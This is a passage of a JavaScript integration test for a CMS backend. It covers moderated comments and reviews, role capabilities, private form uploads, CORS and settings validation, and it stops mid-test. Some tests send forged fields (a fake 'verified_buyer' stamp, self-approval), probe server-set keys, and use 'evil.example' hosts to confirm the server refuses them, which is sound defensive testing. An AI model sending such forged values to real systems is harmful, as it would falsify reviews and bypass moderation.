    // OFF by default: the collection must not even exist.
    const before = await fetch(`${BASE}/api/content/comment`);
    if (before.status === 404) ok('comments: OFF by default — the collection does not exist');
    else fail('comments on by default', `status=${before.status}`);

    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ comments_enabled: true, reviews_enabled: true }),
    });
    // The settings route reloads the plugin registry when one of these two
    // keys changes — without that an operator ticks the box, sees "Settings
    // saved", and the endpoint 404s until the server restarts.

    const after = await fetch(`${BASE}/api/content/comment`);
    if (after.status === 200) ok('comments: switching them on registers the collection');
    else fail('comments not registered', `status=${after.status}`);

    if (after.status === 200) {
      const posts = await (await fetch(`${BASE}/api/posts?limit=1`)).json().catch(() => null);
      const postId = posts?.data?.[0]?.id;
      if (postId) {
        const said = await fetch(`${BASE}/api/content/comment`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
          body: JSON.stringify({ post_id: postId, author_name: 'A reader', body: 'A thoughtful remark.' }),
        });
        if (said.status === 201) ok('comments: a stranger can leave one');
        else fail('comment submit', `status=${said.status} ${(await said.text()).slice(0, 160)}`);

        const publicList = await (await fetch(`${BASE}/api/content/comment?where.post_id=${postId}`))
          .json().catch(() => null);
        if (!(publicList?.data || []).some((c) => c.data?.body === 'A thoughtful remark.')) {
          ok('comments: it is NOT public until approved');
        } else fail('comment published', 'a pending comment is readable');
      }

      // A REVIEW, and the stamp a reviewer must not be able to send.
      const faked = await fetch(`${BASE}/api/content/review`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
        body: JSON.stringify({
          product_id: 'no-such-product', author_name: 'A stranger',
          rating: 5, body: 'Best product ever.', verified_buyer: true,
        }),
      });
      const fakedJson = await faked.json().catch(() => null);
      if (faked.status === 201) ok('reviews: a stranger can leave one');
      else fail('review submit', `status=${faked.status} ${JSON.stringify(fakedJson)?.slice(0, 160)}`);

      const staffReviews = await (await fetch(`${BASE}/api/content/review`, { headers: h }))
        .json().catch(() => null);
      const mine = (staffReviews?.data || []).find((r) => r.data?.body === 'Best product ever.');
      if (mine && mine.data.verified_buyer === undefined) {
        ok('THE STAMP: a posted verified_buyer is DROPPED, not stored');
      } else fail('verified_buyer forged', JSON.stringify(mine?.data)?.slice(0, 160));

      // An out-of-range rating is refused by the RULE, not by a route check.
      const badRating = await fetch(`${BASE}/api/content/review`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
        body: JSON.stringify({ product_id: 'p', author_name: 'A', rating: 9, body: 'Nine stars.' }),
      });
      if (badRating.status === 422) ok('reviews: a rating outside 1-5 is refused');
      else fail('rating unbounded', `status=${badRating.status}`);
    }

    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ comments_enabled: false, reviews_enabled: false }),
    });
  }

  // 8h1h. ROLE CAPABILITIES (C-138). The extraction is pinned by unit tests;
  // this proves the override REACHES a route guard on a live server.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const read = await (await fetch(`${BASE}/api/roles/capabilities`, { headers: h })).json().catch(() => null);
    if ((read?.data?.capabilities || []).length > 0 && (read?.data?.roles || []).length === 5) {
      ok('roles: the capability matrix is readable');
    } else fail('capability read', JSON.stringify(read?.data)?.slice(0, 200));

    const adminRow = (read?.data?.roles || []).find((r) => r.role === 'admin');
    if (adminRow && adminRow.editable === false) ok('roles: admin is marked NOT editable');
    else fail('admin editable', JSON.stringify(adminRow));

    // An entry equal to the built-in grant is dropped, so the table holds only
    // real differences.
    const noop = await (await fetch(`${BASE}/api/roles/capabilities`, {
      method: 'PUT', headers: h,
      body: JSON.stringify({ overrides: { editor: { author_posts: true } } }),
    })).json().catch(() => null);
    if (JSON.stringify(noop?.data?.overrides) === '{}') ok('roles: a no-op override is not stored');
    else fail('noop stored', JSON.stringify(noop?.data?.overrides));

    // A real revocation is stored and reflected in the effective list.
    const revoked = await (await fetch(`${BASE}/api/roles/capabilities`, {
      method: 'PUT', headers: h,
      body: JSON.stringify({ overrides: { manager: { delete_products: false } } }),
    })).json().catch(() => null);
    const mgr = (revoked?.data?.roles || []).find((r) => r.role === 'manager');
    if (mgr && !mgr.effective.includes('delete_products')) ok('roles: a revocation takes effect');
    else fail('revocation', JSON.stringify(mgr));

    // Admin cannot be reduced, whatever is sent.
    const tryAdmin = await (await fetch(`${BASE}/api/roles/capabilities`, {
      method: 'PUT', headers: h,
      body: JSON.stringify({ overrides: { admin: { import_content: false } } }),
    })).json().catch(() => null);
    const adm = (tryAdmin?.data?.roles || []).find((r) => r.role === 'admin');
    if (adm && adm.effective.includes('import_content')) ok('roles: ADMIN cannot be reduced');
    else fail('admin reduced', JSON.stringify(adm));

    // The capability list reaches /api/auth/me, so a client need not know the
    // role table to predict what a call will do.
    const me = await (await fetch(`${BASE}/api/auth/me`, { headers: h })).json().catch(() => null);
    if (Array.isArray(me?.data?.capabilities) && me.data.capabilities.includes('import_content')) {
      ok('auth/me carries the effective capabilities');
    } else fail('me capabilities', JSON.stringify(me?.data?.capabilities));

    // The change is audited.
    const audit = await (await fetch(`${BASE}/api/audit?limit=20`, { headers: h })).json().catch(() => null);
    const rows = audit?.data?.events ?? audit?.data ?? [];
    if (Array.isArray(rows) && rows.some((e) => e.action === 'role.capabilities.update')) {
      ok('roles: the change is written to the audit log');
    } else fail('capability audit', JSON.stringify(rows)?.slice(0, 160));

    await fetch(`${BASE}/api/roles/capabilities`, {
      method: 'PUT', headers: h, body: JSON.stringify({ overrides: {} }),
    });
  }

  // 8h1i. FIELD FILTERS on a custom collection (C-128, and the primitive
  // comments and reviews are built on). Before this the endpoint took only
  // limit/offset/page, so "the comments on THIS post" meant fetching the whole
  // collection and filtering in the client.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const had = await (await fetch(`${BASE}/api/content-types`, { headers: h })).json().catch(() => null);
    const others = (had?.data || []).filter((d) => d.source !== 'plugin').map(({ source, ...d }) => d);
    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: h,
      body: JSON.stringify([...others, {
        name: 'smoke-note',
        label: 'Smoke note',
        visibility: 'public',
        fields: [
          { name: 'post_id', rule: { type: 'id' } },
          { name: 'body', rule: { type: 'string' } },
          { name: 'tags', rule: { type: 'array', of: 'string', optional: true } },
        ],
      }]),
    });
    if (put.status === 200) {
      for (const [pid, body, tags] of [['p1', 'one', ['a']], ['p1', 'two', ['b']], ['p2', 'three', ['a']]]) {
        await fetch(`${BASE}/api/content/smoke-note`, {
          method: 'POST', headers: h, body: JSON.stringify({ post_id: pid, body, tags }),
        });
      }
      const one = await (await fetch(`${BASE}/api/content/smoke-note?where.post_id=p1`)).json().catch(() => null);
      if ((one?.data || []).length === 2) ok('content: ?where.field= narrows the collection');
      else fail('where filter', JSON.stringify(one?.data?.length));
      if (one?.meta?.total === 2) ok('content: the total reflects the filter, not the collection');
      else fail('where total', JSON.stringify(one?.meta));

      const tagged = await (await fetch(`${BASE}/api/content/smoke-note?where.tags=a`)).json().catch(() => null);
      if ((tagged?.data || []).length === 2) ok('content: an array field matches if ANY item does');
      else fail('array where', JSON.stringify(tagged?.data?.length));

      // An UNDECLARED name is ignored, never an error — and cannot reach a
      // server-set key.
      const stale = await (await fetch(`${BASE}/api/content/smoke-note?where.nonsense=x`)).json().catch(() => null);
      if ((stale?.data || []).length === 3) ok('content: an unknown filter is ignored, not refused');
      else fail('stale filter', JSON.stringify(stale?.data?.length));
      const probing = await (await fetch(`${BASE}/api/content/smoke-note?where._status=pending`)).json().catch(() => null);
      if ((probing?.data || []).length === 3) ok('content: a filter cannot address a server-set key');
      else fail('status probe', JSON.stringify(probing?.data?.length));

      await fetch(`${BASE}/api/content-types`, {
        method: 'PUT', headers: h, body: JSON.stringify(others),
      });
    } else {
      fail('filter fixture', `status=${put.status}`);
    }
  }

  // 8h1k. MEDIA FOLDERS (C-61) — a write-only phantom finished. `folder` has
  // been STORED since the patch route was written and nothing ever read it.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const lib = await (await fetch(`${BASE}/api/media/get`, { headers: h })).json().catch(() => null);
    const first = (lib?.data || [])[0];
    if (first?.id) {
      const patched = await fetch(`${BASE}/api/media/update`, {
        method: 'PATCH', headers: h,
        body: JSON.stringify({ ids: [first.id], patch: { folder: '  Product   shots  ' } }),
      });
      if (patched.status === 200) ok('media: a folder can be set');
      else fail('folder patch', `status=${patched.status}`);

      // THE POINT: the filter must find what the writer stored. The two used
      // to be two spellings of one rule, which is how a patched folder becomes
      // invisible to the filter meant to find it.
      const filtered = await (await fetch(`${BASE}/api/media/get?folder=Product%20shots`, { headers: h }))
        .json().catch(() => null);
      if ((filtered?.data || []).some((m) => m.id === first.id)) {
        ok('THE POINT: the folder filter finds what the writer stored');
      } else fail('folder filter', JSON.stringify(filtered?.data)?.slice(0, 160));

      // The counts a sidebar needs, over the whole library.
      if ((filtered?.meta?.folders || []).some((f) => f.name === 'Product shots')) {
        ok('media: the response carries folder counts');
      } else fail('folder counts', JSON.stringify(filtered?.meta?.folders)?.slice(0, 160));

      // An EMPTY value is the unfiled bucket, not "no filter".
      const unfiled = await (await fetch(`${BASE}/api/media/get?folder=`, { headers: h }))
        .json().catch(() => null);
      if (!(unfiled?.data || []).some((m) => m.id === first.id)) {
        ok('media: ?folder= is the unfiled bucket, not "everything"');
      } else fail('unfiled bucket', 'the filed file came back as unfiled');

      await fetch(`${BASE}/api/media/update`, {
        method: 'PATCH', headers: h, body: JSON.stringify({ ids: [first.id], patch: { folder: '' } }),
      });
    }
  }

  // 8h1j. BRANDING (C-159) and PRINT (C-152).
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h, body: JSON.stringify({ admin_name: 'Back office' }),
    });
    const sidebar = await (await fetch(`${BASE}/admin`, { headers: { Cookie: sessionCookie } })).text();
    if (sidebar.includes('Back office')) ok('branding: the admin uses the configured name');
    else fail('admin name', 'the sidebar still says the product name');
    const signin = await (await fetch(`${BASE}/login`)).text();
    if (signin.includes('Back office')) ok('branding: the SIGN-IN page uses it too');
    else fail('login name', 'the sign-in page still says the product name');
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h, body: JSON.stringify({ admin_name: '' }),
    });

    // A third-party logo must be ignored, not fetched into every admin page.
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h, body: JSON.stringify({ admin_logo: 'https://evil.example/x.png' }),
    });
    const withLogo = await (await fetch(`${BASE}/admin`, { headers: { Cookie: sessionCookie } })).text();
    if (!withLogo.includes('evil.example')) ok('branding: a third-party logo url is ignored');
    else fail('third-party logo', 'the admin loads an image from another server');
    await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h, body: JSON.stringify({ admin_logo: '' }),
    });
  }

  // 8h1l. PER-RECORD APPROVAL (C-142/C-35). `visibility` is collection-wide, so
  // "public" published every row including one posted seconds ago by a bot.
  // This is the primitive both comments and reviews were blocked on.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const had = await (await fetch(`${BASE}/api/content-types`, { headers: h })).json().catch(() => null);
    const rest = (had?.data || []).filter((d) => d.source !== 'plugin').map(({ source, ...d }) => d);
    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: h,
      body: JSON.stringify([...rest, {
        name: 'smoke-comment',
        label: 'Smoke comment',
        visibility: 'public',
        writable: 'public',
        moderated: true,
        fields: [{ name: 'body', rule: { type: 'string', max: 500 } }],
      }]),
    });
    if (put.status === 200) {
      ok('content types: a type can ask for approval before publishing');

      // A PUBLIC submission — no session cookie at all.
      const posted = await fetch(`${BASE}/api/content/smoke-comment`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
        body: JSON.stringify({ body: 'A stranger wrote this.' }),
      });
      if (posted.status === 201) ok('a stranger can submit to a moderated type');
      else fail('moderated submit', `status=${posted.status} ${(await posted.text()).slice(0, 160)}`);

      // THE POINT: it must NOT be public yet.
      const anon = await (await fetch(`${BASE}/api/content/smoke-comment`)).json().catch(() => null);
      const anonBodies = (anon?.data || []).map((e) => e.data?.body);
      if (!anonBodies.includes('A stranger wrote this.')) {
        ok('THE POINT: a pending submission is invisible to the public');
      } else fail('pending row published', JSON.stringify(anonBodies)?.slice(0, 160));

      // Staff see it, and can approve it.
      const staffList = await (await fetch(`${BASE}/api/content/smoke-comment`, { headers: h })).json().catch(() => null);
      const pending = (staffList?.data || []).find((e) => e.data?.body === 'A stranger wrote this.');
      if (pending && pending.data?._status === 'pending') ok('staff see it, marked pending');
      else fail('pending invisible to staff', JSON.stringify(staffList?.data)?.slice(0, 200));

      if (pending) {
        // A single-entity GET must 404 for the public while it waits.
        const one = await fetch(`${BASE}/api/content/smoke-comment/${pending.id}`);
        if (one.status === 404) ok('a pending record 404s on its own URL too');
        else fail('pending readable by id', `status=${one.status}`);

        const approve = await fetch(`${BASE}/api/content/smoke-comment/${pending.id}`, {
          method: 'PUT', headers: h, body: JSON.stringify({ _status: 'approved' }),
        });
        if (approve.status === 200) ok('staff can approve it');
        else fail('approve', `status=${approve.status} ${(await approve.text()).slice(0, 160)}`);

        const after = await (await fetch(`${BASE}/api/content/smoke-comment`)).json().catch(() => null);
        if ((after?.data || []).some((e) => e.data?.body === 'A stranger wrote this.')) {
          ok('once approved, it IS public');
        } else fail('approved row still hidden', JSON.stringify(after?.data)?.slice(0, 160));

        // And an invented state is refused.
        const bogus = await fetch(`${BASE}/api/content/smoke-comment/${pending.id}`, {
          method: 'PUT', headers: h, body: JSON.stringify({ _status: 'published-please' }),
        });
        if (bogus.status === 422) ok('an invented approval state is refused');
        else fail('bogus status accepted', `status=${bogus.status}`);
      }

      // A STAFF entry skips the queue — typing it IS the approval.
      const byStaff = await (await fetch(`${BASE}/api/content/smoke-comment`, {
        method: 'POST', headers: h, body: JSON.stringify({ body: 'A colleague wrote this.' }),
      })).json().catch(() => null);
      if (byStaff?.data?.data?._status === 'approved') ok('a staff entry is approved on arrival');
      else fail('staff entry pending', JSON.stringify(byStaff?.data)?.slice(0, 160));

      // A submitter must not be able to approve their own.
      const selfApproved = await fetch(`${BASE}/api/content/smoke-comment`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
        body: JSON.stringify({ body: 'Approve me.', _status: 'approved' }),
      });
      const anon2 = await (await fetch(`${BASE}/api/content/smoke-comment`)).json().catch(() => null);
      if (selfApproved.status === 201 && !(anon2?.data || []).some((e) => e.data?.body === 'Approve me.')) {
        ok('a submitter CANNOT post their own approval');
      } else fail('self-approval worked', `status=${selfApproved.status}`);

      await fetch(`${BASE}/api/content-types`, {
        method: 'PUT', headers: h, body: JSON.stringify(rest),
      });
    } else {
      fail('moderated content type', `status=${put.status} ${(await put.text()).slice(0, 200)}`);
    }
  }

  // 8h1m. FILE UPLOADS ON PUBLIC FORMS (C-23). The bytes must NOT be readable
  // from /uploads, and the download route must refuse an anonymous caller —
  // that is the whole reason the private directory exists.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const had = await (await fetch(`${BASE}/api/content-types`, { headers: h })).json().catch(() => null);
    const others = (had?.data || []).filter((d) => d.source !== 'plugin').map(({ source, ...d }) => d);
    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: h,
      body: JSON.stringify([...others, {
        name: 'smoke-application',
        label: 'Smoke application',
        visibility: 'staff',
        writable: 'public',
        fields: [
          { name: 'email', rule: { type: 'email' } },
          { name: 'cv', rule: { type: 'file' } },
        ],
      }]),
    });
    if (put.status === 200) {
      ok('content types: a public form may declare a file field');

      // A one-pixel PNG, built here rather than read from a fixture.
      const png = Buffer.from(
        'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==',
        'base64',
      );
      const fd = new FormData();
      fd.append('file', new Blob([png], { type: 'image/png' }), 'cv.png');
      const up = await fetch(`${BASE}/api/forms/smoke-application/upload`, {
        method: 'POST',
        headers: { 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
        body: fd,
      });
      const upJson = await up.json().catch(() => null);
      if (up.status === 201 && /^pf_[0-9a-f]{20}$/.test(upJson?.data?.id ?? '')) {
        ok('a stranger can attach a file, and gets an id back');
      } else fail('upload', `status=${up.status} ${JSON.stringify(upJson)?.slice(0, 200)}`);

      if (upJson?.data && !('url' in upJson.data)) ok('the upload answer carries NO url');
      else fail('upload leaks a url', JSON.stringify(upJson?.data)?.slice(0, 160));

      const id = upJson?.data?.id;
      if (id) {
        // THE POINT: anonymous download must fail.
        const anon = await fetch(`${BASE}/api/forms/file/${id}`);
        // 401 from the middleware, which refuses a non-public API GET before
        // the route runs, or 404 from the route itself. Either is correct and
        // neither confirms the file exists: the 401 is returned for any id at
        // all, including one that was never issued.
        if (anon.status === 401 || anon.status === 404) {
          ok('THE POINT: an anonymous caller cannot download a submitted file');
        } else fail('private file leaked', `status=${anon.status}`);

        // ...and staff can.
        const staff = await fetch(`${BASE}/api/forms/file/${id}`, { headers: { Cookie: sessionCookie } });
        if (staff.status === 200 && /attachment/.test(staff.headers.get('content-disposition') || '')) {
          ok('staff can download it, as an attachment');
        } else fail('staff download', `status=${staff.status}`);

        // The record can carry it, and a bogus id cannot.
        const made = await fetch(`${BASE}/api/content/smoke-application`, {
          method: 'POST', headers: h, body: JSON.stringify({ email: 'a@b.gr', cv: id }),
        });
        if (made.status === 201) ok('a submission carries the file reference');
        else fail('submission with a file', `status=${made.status} ${(await made.text()).slice(0, 160)}`);

        const bogus = await fetch(`${BASE}/api/content/smoke-application`, {
          method: 'POST', headers: h,
          body: JSON.stringify({ email: 'a@b.gr', cv: 'pf_ffffffffffffffffffff' }),
        });
        if (bogus.status === 422) ok('a reference to an upload that is not there is refused');
        else fail('dangling file reference', `status=${bogus.status}`);
      }

      // The file field from a HEADLESS site: cookie-less, allow-listed origin.
      // It was the second half of the same 403 — a storefront could not even
      // attach the file, let alone post the form that references it.
      {
        const STORE = 'https://frontend.example.com';
        const xfd = new FormData();
        xfd.append('file', new Blob([png], { type: 'image/png' }), 'cv.png');
        const xup = await fetch(`${BASE}/api/forms/smoke-application/upload`, {
          method: 'POST', headers: { Origin: STORE }, body: xfd,
        });
        const xj = await xup.json().catch(() => null);
        if (xup.status === 201 && /^pf_[0-9a-f]{20}$/.test(xj?.data?.id ?? '')) {
          ok('a headless storefront can attach a file, cookie-less');
        } else fail('cross-origin upload', `status=${xup.status} ${JSON.stringify(xj)?.slice(0, 160)}`);
        if (xj?.data?.id) {
          const xpost = await fetch(`${BASE}/api/content/smoke-application`, {
            method: 'POST', headers: { 'Content-Type': 'application/json', Origin: STORE },
            body: JSON.stringify({ email: 'far@away.gr', cv: xj.data.id }),
          });
          if (xpost.status === 201) ok('...and submit the form that carries it');
          else fail('cross-origin submission with a file', `status=${xpost.status}`);
        }
        const efd = new FormData();
        efd.append('file', new Blob([png], { type: 'image/png' }), 'cv.png');
        const eup = await fetch(`${BASE}/api/forms/smoke-application/upload`, {
          method: 'POST', headers: { Origin: 'https://evil.example.com' }, body: efd,
        });
        if (eup.status === 403) ok('...while a NON-allow-listed origin still cannot upload');
        else fail('upload cors bypass', `evil origin got ${eup.status}`);
      }

      // A type with no file field must not expose an upload endpoint at all.
      const noField = await fetch(`${BASE}/api/forms/smoke-application-missing/upload`, {
        method: 'POST', headers: { 'X-CSRF-Token': csrfToken, Cookie: `astrobaas_csrf=${csrfToken}` },
        body: new FormData(),
      });
      if (noField.status === 404) ok('a type with no file field has no upload endpoint');
      else fail('upload endpoint too open', `status=${noField.status}`);

      await fetch(`${BASE}/api/content-types`, {
        method: 'PUT', headers: h, body: JSON.stringify(others),
      });
    } else {
      fail('file-field content type', `status=${put.status} ${(await put.text()).slice(0, 200)}`);
    }
  }

  // 8h1n. DECLARED SETTINGS GROUPS (C-127). The point is the ENFORCEMENT: a
  // generated form with no server-side rule is decoration, because the generic
  // size check accepts anything under 64 KB.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const declare = await fetch(`${BASE}/api/settings/update`, {
      method: 'POST', headers: h,
      body: JSON.stringify({ admin_setting_groups: [{
        id: 'smoke-booking', label: 'Booking', public: true,
        fields: [
          { name: 'inbox', rule: { type: 'email' } },
          { name: 'lead_days', rule: { type: 'number', min: 0, max: 30, optional: true } },
        ],
      }] }),
    });
    if (declare.status === 200) {
      ok('settings: a declared group is accepted');

      const put = (body) => fetch(`${BASE}/api/settings/update`, {
        method: 'POST', headers: h, body: JSON.stringify(body),
      });
      const good = await put({ 'public_group.smoke-booking.inbox': 'book@example.gr' });
      if (good.status === 200) ok('a declared field accepts a valid value');
      else fail('declared field refused', `status=${good.status}`);

      const bad = await put({ 'public_group.smoke-booking.lead_days': 'later' });
      if (bad.status === 400) ok('THE ENFORCEMENT: a declared number refuses text');
      else fail('declared rule not enforced', `status=${bad.status}`);

      const outOfRange = await put({ 'public_group.smoke-booking.lead_days': 99 });
      if (outOfRange.status === 400) ok('a declared bound is enforced');
      else fail('declared bound ignored', `status=${outOfRange.status}`);

      // A PUBLIC group is readable anonymously; a private one is not.
      const pub = await (await fetch(`${BASE}/api/settings/get`)).json().catch(() => null);
      if (pub?.data && pub.data['public_group.smoke-booking.inbox'] === 'book@example.gr') {
        ok('a public group reaches an anonymous caller');
      } else fail('public group not disclosed', JSON.stringify(pub?.data)?.slice(0, 160));

      await put({ admin_setting_groups: [{
        id: 'smoke-private', label: 'Private',
        fields: [{ name: 'note', rule: { type: 'string' } }],
      }] });
      await put({ 'group.smoke-private.note': 'staff only' });
      const pub2 = await (await fetch(`${BASE}/api/settings/get`)).json().catch(() => null);
      if (pub2?.data && !('group.smoke-private.note' in pub2.data)) {
        ok('a PRIVATE group is not disclosed anonymously');
      } else fail('private group leaked', 'the value is in the public settings dump');

      // The settings screen renders the declared fields.
      const page = await (await fetch(`${BASE}/admin/settings`, { headers: { Cookie: sessionCookie } })).text();
      if (page.includes('gf-smoke-private-note')) ok('the settings screen renders a declared field');
      else fail('declared field not rendered', 'absent from /admin/settings');

      await put({ admin_setting_groups: [] });
    } else {
      fail('declare a settings group', `status=${declare.status} ${(await declare.text()).slice(0, 200)}`);
    }
  }

  // 8h1o. REPEATERS and FLEXIBLE CONTENT (C-123/C-126), end to end.
  // The unit tests cover the rule; this covers the round trip through storage
  // on all three drivers, and the nested media resolution the API must do.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const before = await (await fetch(`${BASE}/api/content-types`, { headers: h })).json().catch(() => null);
    const keep = (before?.data || []).filter((d) => d.source !== 'plugin').map(({ source, ...d }) => d);
    const withRepeater = {
      name: 'smoke-page',
      label: 'Smoke page',
      visibility: 'public',
      fields: [
        { name: 'title', rule: { type: 'string' } },
        { name: 'team', rule: { type: 'repeater', fields: [
          { name: 'person', rule: { type: 'string' } },
          { name: 'person_email', rule: { type: 'email', optional: true } },
        ] } },
        { name: 'blocks', rule: { type: 'repeater', optional: true, layouts: [
          { name: 'quote', label: 'Quote', fields: [{ name: 'text', rule: { type: 'string' } }] },
          { name: 'stat', label: 'Stat', fields: [{ name: 'value', rule: { type: 'number' } }] },
        ] } },
      ],
    };
    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: h, body: JSON.stringify([...keep, withRepeater]),
    });
    if (put.status === 200) {
      ok('content types: a repeater and a layout list are accepted');

      const made = await (await fetch(`${BASE}/api/content/smoke-page`, {
        method: 'POST', headers: h,
        body: JSON.stringify({
          title: 'Team',
          team: [{ person: 'Anna', person_email: 'anna@example.gr' }, { person: 'Bo' }],
          blocks: [{ _layout: 'quote', text: 'hello' }, { _layout: 'stat', value: 7 }],
        }),
      })).json().catch(() => null);

      if (made?.data?.id) {
        ok('a record with nested items is created');
        const read = await (await fetch(`${BASE}/api/content/smoke-page/${made.data.id}`, { headers: h }))
          .json().catch(() => null);
        const d = read?.data?.data ?? read?.data;
        if (Array.isArray(d?.team) && d.team.length === 2 && d.team[0].person === 'Anna') {
          ok('nested items survive the round trip through storage');
        } else fail('repeater round trip', JSON.stringify(d)?.slice(0, 200));
        if (Array.isArray(d?.blocks) && d.blocks[0]._layout === 'quote' && d.blocks[1].value === 7) {
          ok('a flexible-content list keeps its layout tags');
        } else fail('layouts round trip', JSON.stringify(d?.blocks)?.slice(0, 200));

        // An item missing a required sub-field must be refused, and the message
        // must name the ITEM as well as the field.
        const bad = await fetch(`${BASE}/api/content/smoke-page`, {
          method: 'POST', headers: h,
          body: JSON.stringify({ title: 'x', team: [{ person: 'ok' }, { person_email: 'b@x.gr' }] }),
        });
        const badJson = await bad.json().catch(() => null);
        if (bad.status === 422 && JSON.stringify(badJson).includes('team[1]')) {
          ok('an incomplete nested item is refused, naming the item');
        } else fail('nested validation', `status=${bad.status} ${JSON.stringify(badJson)?.slice(0, 200)}`);

        // An unknown layout must be refused rather than stored untyped.
        const badLayout = await fetch(`${BASE}/api/content/smoke-page`, {
          method: 'POST', headers: h,
          body: JSON.stringify({ title: 'x', team: [{ person: 'a' }], blocks: [{ _layout: 'hero', text: 'x' }] }),
        });
        if (badLayout.status === 422) ok('an unknown layout is refused');
        else fail('unknown layout accepted', `status=${badLayout.status}`);
      } else {
        fail('repeater fixture', JSON.stringify(made)?.slice(0, 200));
      }

      await fetch(`${BASE}/api/content-types`, {
        method: 'PUT', headers: h, body: JSON.stringify(keep),
      });
    } else {
      fail('content types with a repeater', `status=${put.status} ${(await put.text()).slice(0, 200)}`);
    }
  }

  // 8h1p. CONDITIONAL FIELDS + STEPS (C-22/C-125), end to end on a live server.
  // The unit tests cover the resolver; this covers the three doors that use it.
  if (sessionCookie && csrfToken) {
    const h = {
      Cookie: `${sessionCookie}; astrobaas_csrf=${csrfToken}`,
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    };
    const existing = await (await fetch(`${BASE}/api/content-types`, { headers: h })).json().catch(() => null);
    const adminDefs = (existing?.data || []).filter((d) => d.source !== 'plugin')
      .map(({ source, ...d }) => d);
    const enquiry = {
      name: 'smoke-enquiry',
      label: 'Smoke enquiry',
      visibility: 'staff',
      writable: 'public',
      steps: [{ title: 'You' }, { title: 'Your question' }],
      fields: [
        { name: 'email', rule: { type: 'email' } },
        { name: 'about_order', rule: { type: 'enum', values: ['yes', 'no'] } },
        { name: 'order_number', rule: { type: 'string' }, step: 2, showIf: { field: 'about_order', equals: 'yes' } },
        { name: 'message', rule: { type: 'string', max: 500 }, step: 2 },
      ],
    };
    const put = await fetch(`${BASE}/api/content-types`, {
      method: 'PUT', headers: h, body: JSON.stringify([...adminDefs, enquiry]),
    });
    if (put.status === 200) {
      ok('content types: a type with steps and a condition is accepted');

      // The PUBLIC schema endpoint — the half a headless storefront needs.
      const schema = await (await fetch(`${BASE}/api/forms/smoke-enquiry`)).json().catch(() => null);
      if (schema?.data?.stepCount === 2 && schema.data.fields?.length === 4) {
        ok('GET /api/forms/:type serves the schema, steps and all');
      } else fail('form schema', JSON.stringify(schema)?.slice(0, 200));
      if (schema?.data?.fields?.find((f) => f.name === 'order_number')?.showIf?.equals === 'yes') {
        ok('GET /api/forms/:type carries the condition');
      } else fail('form schema condition', 'missing');
      if (schema?.data?.honeypot === 'hp_url' && schema?.data?.submitTo) {
        ok('GET /api/forms/:type names the honeypot and where to post');
      } else fail('form schema meta', JSON.stringify(schema?.data)?.slice(0, 160));

      // A type that does NOT accept public writes must 404 rather than leak.
      const priv = await fetch(`${BASE}/api/forms/no-such-type-at-all`);
      if (priv.status === 404) ok('GET /api/forms/:type 404s an unknown type');
      else fail('form schema leak', `status=${priv.status}`);

      // THE SERVER HALF. A submission that skipped the branch must be accepted
      // even though order_number is declared required.
      const submit = (body) => fetch(`${BASE}/api/content/smoke-enquiry`, {
        method: 'POST', headers: h, body: JSON.stringify(body),
      });
      const skipped = await submit({ email: 'a@b.gr', about_order: 'no', message: 'hello' });
      if (skipped.status === 201 || skipped.status === 200) {
        ok('a submission that skipped a hidden required field is ACCEPTED');
      } else fail('conditional required', `status=${skipped.status} ${(await skipped.text()).slice(0, 160)}`);

      // ...and a value for a field the branch never showed is DROPPED.
      const injected = await submit({
